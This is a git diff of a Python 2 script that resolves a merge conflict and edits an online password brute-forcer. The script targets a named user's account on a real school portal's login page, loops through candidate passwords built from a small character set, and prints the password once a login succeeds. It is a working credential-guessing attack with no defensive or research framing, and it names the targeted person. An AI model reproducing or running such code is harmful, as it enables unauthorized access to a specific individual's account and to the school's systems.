@@ -7,12 +7,8 @@ def login(passwd):
 	cj = cookielib.CookieJar()
 	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 
-<<<<<<< HEAD
 	#opener.addheaders = [('User-agent', 'RedditTesting')]
-=======
-user = 'patrick.zierahn'
->>>>>>> 936721cbf630412177cad00a81ee385dd1e5ac75
-
+	user = 'patrick.zierahn'
 	urllib2.install_opener(opener)
 
 	authentication_url = 'https://goethe-schule-harburg.de/idesk/'
@@ -32,11 +28,11 @@ user = 'patrick.zierahn'
 def bruteforce(charset, maxlength):
     return (''.join(candidate)
         for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
-        for i in range(1, maxlength + 1)))
+        for i in range(maxlength, maxlength + 1)))
 
 for i in list(bruteforce('abl213', 9)):
 	print "check", i
 	if len(login(i)) == 15:
-		print "juhu"
+		print "passwort:"
 		print i
 		exit()
